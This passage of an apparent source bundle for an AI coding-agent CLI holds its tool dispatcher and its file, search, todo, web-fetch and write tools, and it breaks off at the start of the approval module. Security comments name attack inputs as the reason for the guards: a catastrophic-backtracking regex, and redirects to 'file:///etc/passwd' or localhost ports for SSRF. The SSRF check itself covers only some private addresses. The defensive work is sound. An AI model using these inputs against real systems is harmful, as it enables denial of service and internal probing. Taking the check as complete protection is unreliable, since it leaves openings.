  dynamicTools = dynamicTools.filter((tool) => tool.function.name !== toolName);
}

export function clearDynamicTools(): void {
  dynamicTools = [];
}

export function getAllTools() {
  return [...tools, ...dynamicTools];
}

// Dynamic tool handlers (for MCP tools, etc.)
const dynamicHandlers = new Map<string, (args: any) => Promise<string>>();

export function registerDynamicHandler(name: string, handler: (args: any) => Promise<string>): void {
  dynamicHandlers.set(name, handler);
}

export function unregisterDynamicHandler(name: string): void {
  dynamicHandlers.delete(name);
}

/**
 * Dispatch a tool call to the appropriate handler.
 * Returns the tool result as a string.
 */
export async function handleToolCall(toolName: string, args: any, context: ToolCallContext = {}): Promise<string> {
  try {
    switch (toolName) {
      case 'read_file':
        return await readFile(args.file_path, args.offset, args.limit, context.sessionId);
      case 'write_file':
        return await writeFile(args.file_path, args.content, context.sessionId);
      case 'edit_file':
        return await editFile(args.file_path, args.old_string, args.new_string, args.expected_replacements, context.sessionId);
      case 'list_directory':
        return await listDirectory(args.directory_path);
      case 'search_files':
        return await searchFiles(args.search_term, args.directory_path, args.case_sensitive, args.file_extensions);
      case 'bash':
        return await runBash(args.command, args.timeout_ms, context.sessionId, context.abortSignal);
      case 'todo_read':
        return readTodos(context.sessionId);
      case 'todo_write':
        return writeTodos(args.todos, context.sessionId);
      case 'webfetch': {
        const result = await webfetch(args.url, args.format, args.timeout);
        return JSON.stringify(result);
      }
      default: {
        // Check dynamic handlers (MCP tools, sub-agent tools)
        const handler = dynamicHandlers.get(toolName);
        if (handler) {
          return await handler(args);
        }
        return \`Error: Unknown tool "\${toolName}"\`;
      }
    }
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return \`Error executing \${toolName}: \${msg}\`;
  }
}
`,
  },
  {
    path: "src/tools/list-directory.ts",
    content: `/**
 * list_directory tool — List contents of a directory.
 */

import fs from 'node:fs/promises';
import { validatePath } from '../utils/path-validation.js';

export const listDirectoryTool = {
  type: 'function' as const,
  function: {
    name: 'list_directory',
    description: 'List the contents of a directory. Returns entries with [FILE] or [DIR] prefixes.',
    parameters: {
      type: 'object',
      properties: {
        directory_path: {
          type: 'string',
          description: 'Path to the directory to list (relative to working directory). Defaults to ".".',
        },
      },
      required: [],
    },
  },
};

export async function listDirectory(directoryPath = '.'): Promise<string> {
  const validated = await validatePath(directoryPath);
  const entries = await fs.readdir(validated, { withFileTypes: true });

  const lines = entries.map((entry) => {
    const prefix = entry.isDirectory() ? '[DIR] ' : '[FILE]';
    return \`\${prefix} \${entry.name}\`;
  });

  return \`Contents of \${directoryPath} (\${entries.length} entries):\\n\${lines.join('\\n')}\`;
}
`,
  },
  {
    path: "src/tools/read-file.ts",
    content: `/**
 * read_file tool — Read file contents with optional offset and limit.
 *
 * When a file is not found, suggests similar paths to help the model
 * recover from typos without repeated failed attempts.
 */

import fs from 'node:fs/promises';
import { createReadStream } from 'node:fs';
import readline from 'node:readline';
import path from 'node:path';
import { validatePath } from '../utils/path-validation.js';
import { findSimilarPaths } from '../utils/path-suggestions.js';
import { recordRead } from '../utils/file-time.js';

export const readFileTool = {
  type: 'function' as const,
  function: {
    name: 'read_file',
    description: 'Read the contents of a file. Use offset and limit to read specific sections of large files.',
    parameters: {
      type: 'object',
      properties: {
        file_path: { type: 'string', description: 'Path to the file to read (relative to working directory).' },
        offset: { type: 'number', description: 'Line number to start reading from (0-based). Defaults to 0.' },
        limit: { type: 'number', description: 'Maximum number of lines to read. Defaults to 2000.' },
      },
      required: ['file_path'],
    },
  },
};

export async function readFile(filePath: string, offset = 0, limit = 2000, sessionId?: string): Promise<string> {
  let validated: string;
  try {
    validated = await validatePath(filePath);
  } catch (err: any) {
    // If file not found, try to suggest similar paths
    if (err.message?.includes('does not exist') || err.code === 'ENOENT') {
      const suggestions = await findSimilarPaths(filePath);
      let msg = \`File not found: '\${filePath}'\`;
      if (suggestions.length > 0) {
        msg += '\\nDid you mean one of these?\\n' + suggestions.map(s => \`  \${s}\`).join('\\n');
      }
      return msg;
    }
    throw err;
  }

  const start = Math.max(0, offset);
  const maxLines = Math.max(0, limit);
  const lines: string[] = [];

  const stream = createReadStream(validated, { encoding: 'utf8' });
  const lineReader = readline.createInterface({
    input: stream,
    crlfDelay: Infinity,
  });

  try {
    let lineIndex = 0;
    for await (const line of lineReader) {
      if (lineIndex >= start && lines.length < maxLines) {
        lines.push(line);
      }
      lineIndex++;
    }
  } finally {
    lineReader.close();
    stream.destroy();
  }

  // Truncate very long individual lines but don't reformat content
  const slice = lines.map(line =>
    line.length > 2000 ? line.slice(0, 2000) + '... (truncated)' : line
  );

  // Record successful read for staleness tracking
  if (sessionId) {
    recordRead(sessionId, validated);
  }

  return slice.join('\\n')
}`,
  },
  {
    path: "src/tools/search-files.ts",
    content: `/**
 * search_files tool — Recursive text search across files.
 *
 * Uses ripgrep (rg) when available for fast, .gitignore-aware searching.
 * Falls back to a pure JS recursive directory walk if rg is not found.
 */

import fs from 'node:fs/promises';
import { stat } from 'node:fs/promises';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { validatePath } from '../utils/path-validation.js';

export const searchFilesTool = {
  type: 'function' as const,
  function: {
    name: 'search_files',
    description: 'Search for a text pattern across files in a directory (recursive). Returns matching lines with file paths and line numbers.',
    parameters: {
      type: 'object',
      properties: {
        search_term: { type: 'string', description: 'The text or regex pattern to search for.' },
        directory_path: { type: 'string', description: 'Directory to search in. Defaults to ".".' },
        file_extensions: {
          type: 'array',
          items: { type: 'string' },
          description: 'Filter by file extensions, e.g. [".ts", ".js"]. Searches all files if omitted.',
        },
        case_sensitive: { type: 'boolean', description: 'Whether the search is case-sensitive. Defaults to true.' },
      },
      required: ['search_term'],
    },
  },
};

// Detect ripgrep availability at module load
let hasRipgrep = false;
try {
  execFileSync('rg', ['--version'], { stdio: 'pipe' });
  hasRipgrep = true;
} catch {
  // ripgrep not available, will use JS fallback
}

const MAX_RESULTS = 100;
const MAX_PATTERN_LENGTH = 1000;

// Security: Simple regex complexity check to prevent ReDoS
// Naive approach: Only check pattern length, not complexity
// Attack: Pattern (a+)+\$ causes catastrophic backtracking on input 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
function isSafeRegex(pattern: string): boolean {
  // Check for nested quantifiers that commonly cause ReDoS
  const dangerousPatterns = [
    /\\([^)]*\\+[^)]*\\)\\+/,     // (a+)+ or similar
    /\\([^)]*\\*[^)]*\\)\\*/,     // (a*)* or similar
    /\\([^)]*\\+[^)]*\\)\\*/,     // (a+)* or similar
    /\\([^)]*\\*[^)]*\\)\\+/,     // (a*)+ or similar
    /\\+\\+/,                     // a++ (possessive in some engines, dangerous)
    /\\*\\*/,                     // a** (same)
    /\\+\\*/,                     // a+* (same)
    /\\*\\+/,                     // a*+ (same)
  ];

  for (const dangerous of dangerousPatterns) {
    if (dangerous.test(pattern)) {
      return false;
    }
  }

  // Count total quantifiers - too many suggests exponential complexity
  const quantifierCount = (pattern.match(/[+*?{}]/g) || []).length;
  if (quantifierCount > 10) {
    return false;
  }

  return true;
}

// Directories to skip during recursive search
const SKIP_DIRS = new Set([
  'node_modules',
  '.git',
  'dist',
  'build',
  'coverage',
  '__pycache__',
  '.venv',
  'venv',
  '.tox',
  '.nox',
  '.pytest_cache',
  '.mypy_cache',
  '.ruff_cache',
  '.hypothesis',
  '.next',
  'out',
  '.turbo',
  '.cache',
]);

// Track visited inodes to detect symlink cycles
interface SearchResult {
  display: string;
  mtime: number;
}

export async function searchFiles(
  searchTerm: string,
  directoryPath = '.',
  caseSensitive = true,
  fileExtensions?: string[]
): Promise<string> {
  const validated = await validatePath(directoryPath);

  // Security: Validate pattern to prevent ReDoS (Catastrophic Backtracking)
  // Naive approach: Only check pattern length, not complexity
  // Attack: Pattern (a+)+\$ with input 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' causes exponential backtracking
  // In JS fallback, this hangs the process for minutes/hours with 100% CPU
  if (searchTerm.length > MAX_PATTERN_LENGTH) {
    return \`Error: Pattern too long (\${searchTerm.length} chars, max \${MAX_PATTERN_LENGTH})\`;
  }

  // Only validate complexity for JS fallback - ripgrep has its own protections
  if (!hasRipgrep && !isSafeRegex(searchTerm)) {
    return \`Error: Pattern too complex (potential ReDoS attack). Avoid nested quantifiers like (a+)+ or (a*)*\`;
  }

  if (hasRipgrep) {
    return searchWithRipgrep(searchTerm, validated, directoryPath, caseSensitive, fileExtensions);
  }
  return searchWithJs(searchTerm, validated, directoryPath, caseSensitive, fileExtensions);
}

// ─── Ripgrep implementation ───

async function searchWithRipgrep(
  searchTerm: string,
  validated: string,
  directoryPath: string,
  caseSensitive: boolean,
  fileExtensions?: string[],
): Promise<string> {
  const args: string[] = [
    '--line-number',
    '--with-filename',
    '--no-heading',
    '--color=never',
    '--max-filesize=1M',
  ];

  if (!caseSensitive) {
    args.push('--ignore-case');
  }

  if (fileExtensions && fileExtensions.length > 0) {
    for (const ext of fileExtensions) {
      // rg glob expects *.ext format
      const globExt = ext.startsWith('.') ? \`*\${ext}\` : \`*.\${ext}\`;
      args.push(\`--glob=\${globExt}\`);
    }
  }

  args.push('--regexp', searchTerm, validated);

  try {
    const output = execFileSync('rg', args, {
      encoding: 'utf8',
      maxBuffer: 10 * 1024 * 1024,
      timeout: 30_000,
    });

    const lines = output.trim().split('\\n').filter(Boolean);

    if (lines.length === 0) {
      return \`No matches found for "\${searchTerm}" in \${directoryPath}\`;
    }

    // Parse rg output and sort by mtime
    const parsed: SearchResult[] = [];
    for (const line of lines.slice(0, MAX_RESULTS)) {
      // rg output: filepath:linenum:content
      const firstColon = line.indexOf(':');
      const secondColon = line.indexOf(':', firstColon + 1);
      if (firstColon === -1 || secondColon === -1) continue;

      const filePath = line.slice(0, firstColon);
      const lineNum = line.slice(firstColon + 1, secondColon);
      let content = line.slice(secondColon + 1).trim();

      if (content.length > 500) {
        content = content.slice(0, 500) + '... (truncated)';
      }

      const relativePath = path.relative(validated, filePath);
      let mtime = 0;
      try {
        const stats = await stat(filePath);
        mtime = stats.mtimeMs;
      } catch { /* ignore stat errors */ }

      parsed.push({ display: \`\${relativePath}:\${lineNum}: \${content}\`, mtime });
    }

    // Sort by mtime descending (most recently modified first)
    parsed.sort((a, b) => b.mtime - a.mtime);

    const results = parsed.map(r => r.display);
    const suffix = lines.length > MAX_RESULTS ? \`\\n(results truncated at \${MAX_RESULTS})\` : '';
    return \`Found \${results.length} match(es) for "\${searchTerm}":\\n\${results.join('\\n')}\${suffix}\`;

  } catch (err: any) {
    // rg exits with code 1 if no matches found (not an error)
    if (err.status === 1) {
      return \`No matches found for "\${searchTerm}" in \${directoryPath}\`;
    }
    // rg exits with code 2 for actual errors
    if (err.status === 2) {
      const msg = err.stderr?.toString() || err.message;
      return \`Error: ripgrep error: \${msg}\`;
    }
    // Fall back to JS search on any other error
    return searchWithJs(searchTerm, validated, directoryPath, caseSensitive, fileExtensions);
  }
}

// ─── JS fallback implementation ───

async function searchWithJs(
  searchTerm: string,
  validated: string,
  directoryPath: string,
  caseSensitive: boolean,
  fileExtensions?: string[],
): Promise<string> {
  const flags = caseSensitive ? 'g' : 'gi';
  let regex: RegExp;
  try {
    regex = new RegExp(searchTerm, flags);
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    return \`Error: invalid regex pattern "\${searchTerm}": \${message}\`;
  }

  const results: SearchResult[] = [];
  const visitedInodes = new Set<string>();

  async function search(dir: string): Promise<void> {
    if (results.length >= MAX_RESULTS) return;

    const entries = await fs.readdir(dir, { withFileTypes: true });
    for (const entry of entries) {
      if (results.length >= MAX_RESULTS) break;

      const fullPath = path.join(dir, entry.name);

      // Skip symlinks to prevent cycles
      if (entry.isSymbolicLink()) {
        continue;
      }

      // Skip common non-useful directories
      if (entry.isDirectory()) {
        if (SKIP_DIRS.has(entry.name)) continue;

        // Track inode to detect hardlink cycles
        try {
          const stats = await fs.stat(fullPath);
          const inodeKey = \`\${stats.dev}:\${stats.ino}\`;
          if (visitedInodes.has(inodeKey)) {
            continue; // Already visited this directory
          }
          visitedInodes.add(inodeKey);
        } catch {
          // If we can't stat, skip to be safe
          continue;
        }

        await search(fullPath);
        continue;
      }

      if (!entry.isFile()) continue;

      // Filter by extension
      if (fileExtensions && fileExtensions.length > 0) {
        const ext = path.extname(entry.name);
        if (!fileExtensions.includes(ext)) continue;
      }

      try {
        const content = await fs.readFile(fullPath, 'utf8');
        const stats = await stat(fullPath);
        const lines = content.split('\\n');
        for (let i = 0; i < lines.length && results.length < MAX_RESULTS; i++) {
          if (regex.test(lines[i])) {
            const relativePath = path.relative(validated, fullPath);
            let lineContent = lines[i].trim();

            // Truncate long lines
            if (lineContent.length > 500) {
              lineContent = lineContent.slice(0, 500) + '... (truncated)';
            }

            results.push({
              display: \`\${relativePath}:\${i + 1}: \${lineContent}\`,
              mtime: stats.mtimeMs,
            });
          }
          regex.lastIndex = 0; // reset regex state
        }
      } catch {
        // Skip files we can't read (binary, permission issues)
      }
    }
  }

  await search(validated);

  if (results.length === 0) {
    return \`No matches found for "\${searchTerm}" in \${directoryPath}\`;
  }

  // Sort by mtime descending (most recently modified first)
  results.sort((a, b) => b.mtime - a.mtime);

  const displayResults = results.map(r => r.display);
  const suffix = results.length >= MAX_RESULTS ? \`\\n(results truncated at \${MAX_RESULTS})\` : '';
  return \`Found \${results.length} match(es) for "\${searchTerm}":\\n\${displayResults.join('\\n')}\${suffix}\`;
}
`,
  },
  {
    path: "src/tools/todo.ts",
    content: `/**
 * todo_read / todo_write tools - in-memory task tracking.
 *
 * The agent uses these to plan multi-step work and track progress.
 * Todos are stored per session. The active session can also persist them
 * through the session store.
 */

export interface TodoItem {
  id: string;
  content: string;
  status: 'pending' | 'in_progress' | 'completed' | 'cancelled';
  priority: 'high' | 'medium' | 'low';
}

const DEFAULT_SESSION_ID = '__default__';

// Session-scoped in-memory storage
const todosBySession = new Map<string, TodoItem[]>();

function getSessionKey(sessionId?: string): string {
  return sessionId ?? DEFAULT_SESSION_ID;
}

function cloneTodos(todos: TodoItem[]): TodoItem[] {
  return todos.map((todo) => ({ ...todo }));
}

function formatTodos(todos: TodoItem[], heading: string): string {
  if (todos.length === 0) {
    return \`\${heading}\\nNo TODOs.\`;
  }

  const statusIcons: Record<TodoItem['status'], string> = {
    pending: '[ ]',
    in_progress: '[~]',
    completed: '[x]',
    cancelled: '[-]',
  };

  const lines = todos.map((t) => \`\${statusIcons[t.status]} [\${t.priority}] \${t.content} (\${t.id})\`);
  return \`\${heading}\\n\${lines.join('\\n')}\`;
}

export const todoReadTool = {
  type: 'function' as const,
  function: {
    name: 'todo_read',
    description: 'Read the current TODO list to check progress on tasks.',
    parameters: {
      type: 'object',
      properties: {},
      required: [],
    },
  },
};

export const todoWriteTool = {
  type: 'function' as const,
  function: {
    name: 'todo_write',
    description: 'Replace the TODO list with an updated version. Use this to plan tasks, update progress, and mark items complete.',
    parameters: {
      type: 'object',
      properties: {
        todos: {
          type: 'array',
          description: 'The complete updated TODO list.',
          items: {
            type: 'object',
            properties: {
              id: { type: 'string', description: 'Unique identifier for the item.' },
              content: { type: 'string', description: 'Description of the task.' },
              status: {
                type: 'string',
                enum: ['pending', 'in_progress', 'completed', 'cancelled'],
                description: 'Current status.',
              },
              priority: {
                type: 'string',
                enum: ['high', 'medium', 'low'],
                description: 'Priority level.',
              },
            },
            required: ['id', 'content', 'status', 'priority'],
          },
        },
      },
      required: ['todos'],
    },
  },
};

export function readTodos(sessionId?: string): string {
  const todos = todosBySession.get(getSessionKey(sessionId)) ?? [];
  return formatTodos(todos, \`TODO List (\${todos.length} items):\`);
}

export function writeTodos(newTodos: TodoItem[], sessionId?: string): string {
  const todos = cloneTodos(newTodos);
  todosBySession.set(getSessionKey(sessionId), todos);
  return formatTodos(todos, \`TODO List Updated (\${todos.length} items):\`);
}

export function getTodosForSession(sessionId?: string): TodoItem[] {
  return cloneTodos(todosBySession.get(getSessionKey(sessionId)) ?? []);
}

export function setTodosForSession(sessionId: string, todos: TodoItem[]): void {
  todosBySession.set(getSessionKey(sessionId), cloneTodos(todos));
}

export function clearTodos(sessionId?: string): void {
  todosBySession.delete(getSessionKey(sessionId));
}
`,
  },
  {
    path: "src/tools/webfetch.ts",
    content: `/**
 * webfetch tool — Fetch and process web content
 *
 * Features:
 * - Single URL fetch per invocation
 * - Three output formats: text, markdown, html
 * - Configurable timeout (default 30s, max 120s)
 * - 5MB response size limit + 2MB output limit
 * - HTML to text/markdown conversion
 * - AbortController support for cancellation
 * - Robust HTML entity decoding
 * - Proper redirect limiting
 * - Charset-aware content decoding
 */

import { convert } from "html-to-text";

const MAX_RESPONSE_SIZE = 5 * 1024 * 1024; // 5MB
const MAX_OUTPUT_SIZE = 2 * 1024 * 1024; // 2MB
const MAX_REDIRECTS = 10;
const MAX_URL_LENGTH = 4096;

const FETCH_HEADERS = {
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
  DNT: "1",
  Connection: "keep-alive",
  "Upgrade-Insecure-Requests": "1",
};

// Text-based MIME types that are safe to process
const TEXT_MIME_TYPES = [
  "text/",
  "application/json",
  "application/xml",
  "application/x-www-form-urlencoded",
  "application/atom+xml",
  "application/rss+xml",
  "application/javascript",
  "application/typescript",
];

// Lazy-loaded Turndown instance — converts HTML to Markdown
// We lazy-load because Turndown is a CommonJS module; dynamic import keeps our
// ESM output clean without forcing esbuild to bundle everything as CJS.
// Why Turndown? HTML → Markdown preserves document structure (headings, lists,
// links) in a readable format that LLMs handle better than raw HTML markup.
let _turndownService: any = null;
async function getTurndownService(): Promise<any> {
  if (!_turndownService) {
    const { default: TurndownService } = await import("turndown");
    _turndownService = new TurndownService({
      headingStyle: "atx",       // # Heading, not underlined
      codeBlockStyle: "fenced",  // \`\`\`code\`\`\`, not indented
      bulletListMarker: "-",
      emDelimiter: "*",
    });
    // Remove noise that doesn't help LLM understanding
    _turndownService.remove(["script", "style", "meta", "link"]);
  }
  return _turndownService;
}

// Lazy-loaded 'he' module — decodes HTML entities like &lt; &gt; &amp;
// We lazy-load for the same CJS/ESM reason as Turndown.
// Why 'he'? Browsers and node don't have built-in HTML entity decoding that
// handles the full set (&nbsp;, &#x2713;, named entities, etc.) correctly.
let _he: any = null;
async function getHe(): Promise<any> {
  if (!_he) {
    const { default: he } = await import("he");
    _he = he;
  }
  return _he;
}

/**
 * Check if MIME type is text-based
 */
function isTextMimeType(mimeType: string): boolean {
  return TEXT_MIME_TYPES.some((type) => mimeType.includes(type));
}

/**
 * Detect if content is HTML
 */
function detectHTML(content: string, contentType: string): boolean {
  // Header says HTML
  if (contentType.includes("text/html")) {
    return true;
  }

  // Sniff content for HTML signature
  const trimmed = content.slice(0, 1024).trim().toLowerCase();
  return /^<!doctype html|^<html|^<head|^<body|^<meta/.test(trimmed);
}

/**
 * Parse charset from Content-Type header
 */
function parseCharset(contentType: string): string {
  const match = contentType.match(/charset=([^\\s;]+)/i);
  if (match) {
    const charset = match[1].replace(/['"]/g, "");
    // Validate charset is supported by TextDecoder
    try {
      new TextDecoder(charset);
      return charset;
    } catch {
      return "utf-8";
    }
  }
  return "utf-8";
}

/**
 * Truncate output if too large
 */
function truncateOutput(output: string, maxSize: number): string {
  if (output.length > maxSize) {
    const truncatedSize = Math.max(100, maxSize - 100);
    return (
      output.slice(0, truncatedSize) +
      \`\\n\\n[Content truncated: \${output.length} characters exceeds \${maxSize} limit]\`
    );
  }
  return output;
}

export const webfetchTool = {
  type: "function" as const,
  function: {
    name: "webfetch",
    description:
      "Fetch and process content from a web URL. Supports text (plain text extraction), markdown (HTML to markdown conversion), or html (raw HTML) output formats.",
    parameters: {
      type: "object",
      properties: {
        url: {
          type: "string",
          description:
            "HTTP(S) URL to fetch (must start with http:// or https://)",
        },
        format: {
          type: "string",
          enum: ["text", "markdown", "html"],
          description:
            "Output format: text (plain text), markdown (HTML to markdown), or html (raw HTML)",
        },
        timeout: {
          type: "number",
          description: "Timeout in seconds (default 30, min 1, max 120)",
        },
      },
      required: ["url", "format"],
    },
  },
};

/**
 * Convert HTML to plain text using html-to-text library
 */
function htmlToText(html: string): string {
  try {
    return convert(html, {
      wordwrap: 120,
      selectors: [
        { selector: "img", options: { ignoreHref: true } },
        { selector: "a", options: { ignoreHref: true } },
      ],
    });
  } catch (error) {
    // Fallback: basic regex if library fails
    return html
      .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, "")
      .replace(/<style\\b[^<]*(?:(?!<\\/style>)<[^<]*)*<\\/style>/gi, "")
      .replace(/<[^>]+>/g, " ")
      .split("\\n")
      .map((line) => line.trim())
      .filter((line) => line.length > 0)
      .join("\\n");
  }
}

/**
 * Convert HTML to Markdown using Turndown (cached instance)
 */
async function htmlToMarkdown(html: string): Promise<string> {
  try {
    const turndown = await getTurndownService();
    return turndown.turndown(html);
  } catch (error) {
    // Fallback: treat as code block
    return \`\\\`\\\`\\\`html\\n\${html}\\n\\\`\\\`\\\`\`;
  }
}

/**
 * Check if URL points to private/internal IP (SSRF protection)
 */
function isPrivateUrl(url: string): boolean {
  try {
    const parsed = new URL(url);

    const hostname = parsed.hostname;

    // Only allow http/https
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
      return true; // Treat non-http(s) as private/block (includes file://)
    }

    // Check for localhost variations
    if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('127.')) {
      return true;
    }

    // Check for IPv6 localhost
    if (hostname === '[::1]' || hostname === '::1') {
      return true;
    }

    // Check for private IPv4 ranges
    const parts = hostname.split('.').map(Number);
    if (parts.length === 4 && parts.every(p => !isNaN(p) && p >= 0 && p <= 255)) {
      // 10.0.0.0/8
      if (parts[0] === 10) return true;
      // 172.16.0.0/12
      if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
      // 192.168.0.0/16
      if (parts[0] === 192 && parts[1] === 168) return true;
      // 169.254.0.0/16 (link-local)
      if (parts[0] === 169 && parts[1] === 254) return true;
    }

    return false;
  } catch {
    return true; // Invalid URL = block
  }
}

/**
 * Fetch with redirect limiting and SSRF protection
 */
async function fetchWithRedirectLimit(
  url: string,
  signal: AbortSignal,
): Promise<Response> {
  // Security: Validate initial URL for SSRF
  // Naive approach: Only check redirect count, not destination
  // Attack: Redirect to file:///etc/passwd or http://localhost:22 to scan internal services
  if (isPrivateUrl(url)) {
    throw new Error(\`SSRF protection: URL \${url} points to internal/private address\`);
  }

  let redirectCount = 0;
  let currentUrl = url;

  // Create a custom fetch wrapper that tracks redirects
  const originalFetch = global.fetch;

  while (redirectCount < MAX_REDIRECTS) {
    const response = await originalFetch(currentUrl, {
      signal,
      headers: FETCH_HEADERS,
      redirect: "manual", // Handle redirects manually to count them
    });

    // Check for redirect status
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get("location");
      if (location) {
        redirectCount++;
        // Resolve relative URLs
        currentUrl = new URL(location, currentUrl).href;

        // Security: Validate redirect destination for SSRF
        // Naive approach: Follow any redirect
        // Attack: Legitimate site redirects to file://localhost/etc/passwd
        if (isPrivateUrl(currentUrl)) {
          throw new Error(\`SSRF protection: Redirect to \${currentUrl} blocked (internal/private address)\`);
        }

        continue;
      }
    }

    return response;
  }

  throw new Error(\`Too many redirects (max \${MAX_REDIRECTS})\`);
}

/**
 * Fetch and process a URL
 *
 * @param url - HTTP(S) URL to fetch
 * @param format - Output format: 'text', 'markdown', or 'html'
 * @param timeout - Optional timeout in seconds (default 30, max 120)
 * @returns Object with output, title, and metadata
 * @throws Error on validation, network, or processing failures
 */
export async function webfetch(
  url: string,
  format: "text" | "markdown" | "html",
  timeout?: number,
): Promise<{
  output: string;
  title: string;
  metadata: Record<string, unknown>;
}> {
  // Validate URL
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    throw new Error("Invalid URL format. Must start with http:// or https://");
  }

  if (url.length > MAX_URL_LENGTH) {
    throw new Error(
      \`URL too long (\${url.length} characters, max \${MAX_URL_LENGTH})\`,
    );
  }

  // Validate format
  if (!["text", "markdown", "html"].includes(format)) {
    throw new Error("Invalid format. Must be 'text', 'markdown', or 'html'");
  }

  // Validate timeout
  const timeoutSeconds = Math.min(timeout ?? 30, 120);
  if (timeoutSeconds < 1) {
    throw new Error("Timeout must be between 1 and 120 seconds");
  }

  // Setup timeout for entire operation
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutSeconds * 1000);

  try {
    const startTime = Date.now();

    // Fetch with redirect limiting
    const response = await fetchWithRedirectLimit(url, controller.signal);

    // Check HTTP status
    if (!response.ok) {
      throw new Error(\`HTTP \${response.status} error: \${response.statusText}\`);
    }

    // Validate response size by header
    const contentLength = response.headers.get("content-length");
    if (contentLength && parseInt(contentLength) > MAX_RESPONSE_SIZE) {
      throw new Error(
        \`Response too large (exceeds 5MB limit). Content-Length: \${contentLength}\`,
      );
    }

    // Get content type
    const contentType = response.headers.get("content-type") ?? "text/plain";

    // Check if content type is text-based
    if (!isTextMimeType(contentType)) {
      throw new Error(
        \`Content type '\${contentType}' is not supported. Only text-based formats are allowed.\`,
      );
    }

    // Get response as ArrayBuffer (not .text() or .blob()) because:
    // 1. response.text() always decodes as UTF-8 — would corrupt non-UTF-8 pages
    //    (e.g., Shift_JIS, GB2312, windows-1251 sites)
    // 2. ArrayBuffer preserves raw bytes so we can use TextDecoder with the
    //    CORRECT charset from the Content-Type header
    // 3. We can check byteLength BEFORE decoding for security (5MB limit)
    const arrayBuffer = await response.arrayBuffer();

    // Check actual response size
    if (arrayBuffer.byteLength > MAX_RESPONSE_SIZE) {
      throw new Error(
        \`Response too large (exceeds 5MB limit). Size: \${arrayBuffer.byteLength}\`,
      );
    }

    // Parse charset from Content-Type header
    const charset = parseCharset(contentType);

    // Decode response with appropriate charset
    const decoder = new TextDecoder(charset, { fatal: false });
    const content = decoder.decode(arrayBuffer);

    const isHTML = detectHTML(content, contentType);

    // Format content based on requested format
    let output: string;
    if (format === "text") {
      output = isHTML ? htmlToText(content) : content;
    } else if (format === "markdown") {
      output = isHTML
        ? await htmlToMarkdown(content)
        : \`\\\`\\\`\\\`\\n\${content}\\n\\\`\\\`\\\`\`;
    } else {
      // format === 'html'
      output = content;
    }

    // Decode HTML entities ONLY for text/markdown formats (not for raw HTML)
    if (format !== "html") {
      const he = await getHe();
      output = he.decode(output);
    }

    // Truncate output if too large
    output = truncateOutput(output, MAX_OUTPUT_SIZE);

    const fetchTime = Date.now() - startTime;
    const title = \`\${url} (\${contentType})\`;
    const metadata = {
      url,
      format,
      contentType,
      charset,
      contentLength: arrayBuffer.byteLength,
      outputLength: output.length,
      fetchTime,
    };

    return { output, title, metadata };
  } catch (error) {
    // Handle AbortError (timeout or cancellation)
    if (error instanceof Error && error.name === "AbortError") {
      throw new Error(\`Fetch timeout after \${timeoutSeconds} seconds\`);
    }

    // Re-throw our errors as-is
    if (error instanceof Error) {
      throw error;
    }

    // Handle unexpected errors
    throw new Error(\`Failed to fetch \${url}: \${String(error)}\`);
  } finally {
    clearTimeout(timeoutId);
  }
}
`,
  },
  {
    path: "src/tools/write-file.ts",
    content: `/**
 * write_file tool — Create or overwrite a file. Requires approval.
 */

import fs from "node:fs/promises";
import path from "node:path";
import { validatePath } from "../utils/path-validation.js";
import { requestApproval } from "../utils/approval.js";
import { recordRead } from "../utils/file-time.js";
import { atomicWriteFile } from "../utils/atomic-write.js";

export const writeFileTool = {
  type: "function" as const,
  function: {
    name: "write_file",
    description:
      "Create a new file or overwrite an existing file with the given content. Prefer edit_file for modifying existing files.",
    parameters: {
      type: "object",
      properties: {
        file_path: {
          type: "string",
          description:
            "Path to the file to write (relative to working directory).",
        },
        content: {
          type: "string",
          description: "The full content to write to the file.",
        },
      },
      required: ["file_path", "content"],
    },
  },
};

export async function writeFile(
  filePath: string,
  content: string,
  sessionId?: string,
): Promise<string> {
  const validated = await validatePath(filePath);

  // Request approval
  const preview =
    content.length > 500
      ? \`\${content.slice(0, 250)}\\n... (\${content.length} chars total) ...\\n\${content.slice(-250)}\`
      : content;

  const approved = await requestApproval({
    id: \`write-\${Date.now()}\`,
    type: "file_write",
    description: \`Write file: \${filePath}\`,
    detail: preview,
    sessionId,
    sessionScopeKey: \`file_write:\${validated}\`,
  });

  if (!approved) {
    return \`Operation cancelled: write to \${filePath} was rejected by user.\`;
  }

  // Ensure parent directory exists
  await fs.mkdir(path.dirname(validated), { recursive: true });

  // Security: Use atomic write utility with O_CREAT|O_EXCL protection
  const result = await atomicWriteFile(validated, content);
  if (!result.success) {
    return \`Error writing file: \${result.error}\`;
  }

  const lines = content.split("\\n").length;

  // Record the write as a read so a subsequent edit_file on this file doesn't
  // immediately fail the staleness guard with "you must read first".
  if (sessionId) {
    recordRead(sessionId, validated);
  }

  return \`Successfully wrote \${lines} lines to \${filePath}\`;
}
`,
  },
  {
    path: "src/utils/approval.ts",
    content: `/**
 * Approval system for destructive operations.
 *
 * Two categories of approval:
 *  1. File operations (write_file, edit_file)
 *  2. Shell commands (non-whitelisted)
 *
 * Approval can be granted:
 *  - Per-operation (one-time)
 *  - Per-operation-type for the session (e.g., "approve all writes")
 *  - Globally via --dangerously-skip-permissions
 *
 * In the Ink UI, approvals are handled by emitting an event and waiting
 * for the UI to resolve it (instead of blocking on stdin with inquirer).
 */

export type ApprovalRequest = {
  id: string;
  type: 'file_write' | 'file_edit' | 'shell_command';
  description: string;
  detail?: string;
  sessionId?: string;
  sessionScopeKey?: string;
};

export type ApprovalResponse = 'approve_once' | 'approve_session' | 'reject';

// Global state
let dangerouslySkipPermissions = false;
